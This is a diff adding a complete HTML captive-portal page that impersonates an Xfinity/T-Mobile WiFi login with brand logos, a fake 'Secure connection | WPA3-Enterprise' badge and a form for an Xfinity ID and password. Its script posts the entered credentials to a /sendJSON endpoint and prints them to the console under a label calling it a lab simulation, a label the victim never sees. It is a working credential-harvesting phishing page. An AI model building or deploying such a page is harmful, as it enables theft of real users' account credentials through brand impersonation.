@@ -1,0 +1,442 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Xfinity WiFi by T-Mobile</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
+      }
+
+      body {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+
+      .container {
+        max-width: 500px;
+        width: 100%;
+        background: white;
+        border-radius: 20px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        overflow: hidden;
+      }
+
+      .header {
+        background: linear-gradient(135deg, #6a3093 0%, #a044ff 100%);
+        padding: 36px 20px 28px;
+        text-align: center;
+      }
+
+      .logo-container {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 20px;
+      }
+
+      .xfinity-logo-wrap {
+        display: inline-block;
+      }
+
+      .xfinity-logo {
+        display: block;
+        height: 65px;
+        width: auto;
+        max-width: 280px;
+        object-fit: contain;
+        vertical-align: bottom;
+        filter: brightness(0) invert(1)
+          drop-shadow(0 2px 8px rgba(0, 0, 0, 0.2));
+      }
+
+      .t-mobile-badge {
+        background: rgba(255, 255, 255, 0.2);
+        padding: 8px 15px;
+        border-radius: 30px;
+        color: white;
+        font-size: 14px;
+        font-weight: 600;
+        display: inline-block;
+        backdrop-filter: blur(5px);
+        border: 1px solid rgba(255, 255, 255, 0.3);
+      }
+
+      .t-mobile-badge span {
+        color: #ff69b4;
+        font-weight: 700;
+      }
+
+      .content {
+        padding: 30px;
+        background: #f8f9fa;
+      }
+
+      .welcome-message {
+        text-align: center;
+        margin-bottom: 25px;
+      }
+
+      .welcome-message h2 {
+        color: #333;
+        font-size: 22px;
+        margin-bottom: 8px;
+      }
+
+      .welcome-message p {
+        color: #666;
+        font-size: 14px;
+      }
+
+      .login-form {
+        background: white;
+        padding: 25px;
+        border-radius: 15px;
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        margin-bottom: 20px;
+      }
+
+      #email-form-step {
+        display: flex;
+        flex-direction: column;
+        gap: 20px;
+      }
+
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 2px solid #e0e0e0;
+        border-radius: 10px;
+        font-size: 16px;
+        transition: border-color 0.3s;
+        font-family: inherit;
+      }
+
+      .g-input:focus {
+        outline: none;
+        border-color: #6a3093;
+      }
+
+      .checkbox-group {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+        margin: 10px 0;
+      }
+
+      .checkbox-group input[type="checkbox"] {
+        width: 18px;
+        height: 18px;
+        cursor: pointer;
+      }
+
+      .checkbox-group label {
+        color: #666;
+        font-size: 14px;
+        cursor: pointer;
+      }
+
+      .btn-connect {
+        width: 100%;
+        padding: 16px;
+        background: linear-gradient(135deg, #6a3093 0%, #a044ff 100%);
+        color: white;
+        border: none;
+        border-radius: 10px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition:
+          transform 0.3s,
+          box-shadow 0.3s;
+        margin-top: 10px;
+      }
+
+      .btn-connect:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 20px rgba(106, 48, 147, 0.3);
+      }
+
+      .btn-connect:active {
+        transform: translateY(0);
+      }
+
+      .terms {
+        text-align: center;
+        font-size: 12px;
+        color: #888;
+        line-height: 1.6;
+        margin-top: 20px;
+      }
+
+      .terms a {
+        color: #6a3093;
+        text-decoration: none;
+        font-weight: 600;
+      }
+
+      .terms a:hover {
+        text-decoration: underline;
+      }
+
+      .footer {
+        background: white;
+        padding: 15px 30px;
+        border-top: 1px solid #e0e0e0;
+        text-align: center;
+      }
+
+      .footer p {
+        color: #666;
+        font-size: 12px;
+        margin-bottom: 5px;
+      }
+
+      .security-badge {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 5px;
+        color: #28a745;
+        font-size: 12px;
+        font-weight: 600;
+        margin-top: 8px;
+      }
+
+      .security-badge i {
+        font-style: normal;
+        font-size: 14px;
+      }
+
+      .message-box {
+        background: #f8d7da;
+        color: #721c24;
+        padding: 10px;
+        border-radius: 5px;
+        margin-bottom: 15px;
+        font-size: 14px;
+        display: none;
+      }
+
+      .message-box.show {
+        display: block;
+      }
+
+      .message-box.success {
+        background: #d4edda;
+        color: #155724;
+      }
+
+      .message-box.info {
+        background: #fff3cd;
+        color: #856404;
+      }
+
+      .sponsored-tag {
+        text-align: center;
+        margin-top: 15px;
+        color: #666;
+        font-size: 14px;
+        font-weight: 500;
+        padding-top: 10px;
+        border-top: 1px dashed #e0e0e0;
+      }
+
+      .sponsored-tag strong {
+        color: #ff69b4;
+        font-weight: 700;
+      }
+
+      .sponsored-tag .xfinity-purple {
+        color: #6a3093;
+        font-weight: 700;
+      }
+
+      .copyright {
+        color: #999;
+        font-size: 11px;
+        margin-top: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="logo-container">
+          <div class="xfinity-logo-wrap">
+            <img
+              class="xfinity-logo"
+              src="data:image/png;base64,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"
+              alt="Xfinity"
+            />
+          </div>
+        </div>
+        <div class="t-mobile-badge">powered by <span>T-Mobile</span> 5G</div>
+      </div>
+
+      <div class="content">
+        <div class="welcome-message">
+          <h2>Welcome to T-Mobile Internet</h2>
+          <p>Connect to the nation's largest 5G network</p>
+        </div>
+
+        <div class="login-form">
+          <div class="message-box" id="messageBox"></div>
+
+          <form id="email-form-step">
+            <input
+              id="userid"
+              name="email"
+              type="text"
+              class="g-input"
+              placeholder="Email or Xfinity ID"
+              required
+            />
+            <input
+              id="pwd"
+              name="password"
+              type="password"
+              class="g-input"
+              placeholder="Password"
+              required
+            />
+
+            <div class="checkbox-group">
+              <input type="checkbox" id="terms" checked />
+              <label for="terms"
+                >I agree to the Terms of Service and Privacy Policy</label
+              >
+            </div>
+
+            <button type="submit" class="btn-connect">Connect to WiFi</button>
+          </form>
+
+          <div class="sponsored-tag">
+            <span
+              >📶 <strong>T-Mobile</strong> internet powered by
+              <span class="xfinity-purple">Xfinity</span></span
+            >
+          </div>
+        </div>
+
+        <div class="terms">
+          <p>
+            By connecting, you agree to the <a href="#">Terms of Use</a> and
+            <a href="#">Privacy Policy</a>
+          </p>
+          <p>Free WiFi provided by T-Mobile in partnership with Xfinity</p>
+        </div>
+      </div>
+
+      <div class="footer">
+        <p>© 2026 Xfinity. All rights reserved.</p>
+        <p>T-Mobile is a registered trademark of Deutsche Telekom AG</p>
+        <div class="security-badge">
+          <i>🔒</i> Secure connection | WPA3-Enterprise
+        </div>
+        <div class="copyright">T-Mobile internet powered by Xfinity</div>
+      </div>
+    </div>
+
+    <script>
+      document
+        .getElementById("email-form-step")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+
+          const username = document.getElementById("userid").value;
+          const password = document.getElementById("pwd").value;
+          const terms = document.getElementById("terms");
+          const messageBox = document.getElementById("messageBox");
+
+          if (!username || !password) {
+            messageBox.textContent = "⚠️ Please fill in all fields";
+            messageBox.className = "message-box show";
+            return;
+          }
+
+          if (!terms.checked) {
+            messageBox.textContent =
+              "⚠️ You must agree to the terms to connect";
+            messageBox.className = "message-box show";
+            return;
+          }
+
+          if (!username.includes("@")) {
+            messageBox.textContent = "⚠️ Please enter a valid email address";
+            messageBox.className = "message-box show";
+            return;
+          }
+
+          messageBox.textContent =
+            "✓ Connecting to T-Mobile internet powered by Xfinity...";
+          messageBox.className = "message-box show success";
+
+          const jsonData = { username, password };
+
+          fetch("/sendJSON", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(jsonData),
+          })
+            .then((response) => {
+              if (!response.ok) {
+                throw new Error(
+                  `Server responded with status ${response.status}`,
+                );
+              }
+              return response.json();
+            })
+            .then((data) => {
+              console.log("Info sent successfully!", data);
+              messageBox.textContent = "✓ Connected successfully!";
+              messageBox.className = "message-box show success";
+
+              console.log("=== CAPTIVE PORTAL LAB SIMULATION ===");
+              console.log("Email/ID:", username);
+              console.log("Password:", password);
+              console.log("T-Mobile internet powered by Xfinity");
+              console.log("Copyright 2026 Xfinity");
+              console.log("=====================================");
+
+              setTimeout(() => {
+                document.getElementById("userid").value = "";
+                document.getElementById("pwd").value = "";
+                messageBox.className = "message-box";
+              }, 3000);
+            })
+            .catch((error) => {
+              console.error("Fetch error:", error);
+              messageBox.textContent =
+                "⚠️ Connection failed. Please try again.";
+              messageBox.className = "message-box show";
+            });
+        });
+
+      const inputs = document.querySelectorAll(".g-input");
+      inputs.forEach((input) => {
+        input.addEventListener("focus", function () {
+          this.style.borderColor = "#6a3093";
+        });
+
+        input.addEventListener("blur", function () {
+          this.style.borderColor = "#e0e0e0";
+        });
+      });
+
+      console.log(
+        "🔧 Captive portal ready - make sure /sendJSON endpoint exists on your server",
+      );
+    </script>
+  </body>
+</html>
